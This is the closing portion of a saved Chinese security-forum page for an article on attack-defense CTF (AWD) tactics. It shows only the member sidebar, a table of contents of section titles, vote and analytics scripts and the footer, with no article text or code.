+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/66522" title="Xian_Yun" style="">Xian_Yun</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">5</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/6362" title="酱油哥" style="">酱油哥</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">5</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame" style="">Ic4_F1ame</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/72065" title="1215280503904834" style="">1215280503904834</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box" id="toc-container" style="width: 270px;">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4>目录</h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 50px;"></div>
+            <ol style="top: 50px;"><li><a href="https://xz.aliyun.com/t/11409#toc-0">改密码</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-1">备份源码</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-2">查找预留后门</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-3">端口扫描</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-4">主机发现</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-5">后门利用</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-6">一句话木马</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-7">隐藏shell</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-8">特殊的shell</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-9">不死马</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-10">权限维持</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-11">软链接</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-12">SSH弱密码利用</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-13"> </a></li><li><a href="https://xz.aliyun.com/t/11409#toc-14">攻击搅屎</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-15">基础查杀</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-16">文件监控</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-17">alias起别名</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-18">杀不死马</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-19">清除反弹shell</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-20">提权</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-21">漏洞修复</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-22">日志分析</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-23">流量分析</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-24"> </a></li><li><a href="https://xz.aliyun.com/t/11409#toc-25">WAF</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-26">防御搅屎</a><ol><li><a href="https://xz.aliyun.com/t/11409#toc-27">1.利用后门getflag</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-28">2.后门批量getflag</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-29">3.利用后门批量getflag并提交</a></li><li><a href="https://xz.aliyun.com/t/11409#toc-30">4.利用后门写shell</a></li></ol></li></ol></div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart);
+            $("[data-toggle='tooltip']").tooltip();
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
+            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
+        </div>
+    </div>
+</footer>
+
+<script src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/bootstrap.min.js"></script>
+<script src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/xz.js"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11409&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11409&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+            $("[data-toggle='tooltip']").tooltip();
+        });
+    </script>
+
+
+    <script src="https://s11.cnzz.com/z_stat.php?id=1260716569&amp;web_id=1260716569"></script>
+
+
+<bookmark-sidebar-wp9y2dxijw id="redeviation-bs-sidebar" class="notranslate" aria-hidden="true" data-theme="default" data-pos="left"><template shadowrootmode="closed"><iframe style="margin:0;padding: 0;border: none;width: 100%;height: 100%;"></iframe></template></bookmark-sidebar-wp9y2dxijw><div id="redeviation-bs-indicator" data-theme="default" class="redeviation-bs-fullHeight redeviation-bs-visible" data-pos="left" style="height: 100%; top: 0%;"><div><span></span></div></div></body></html>
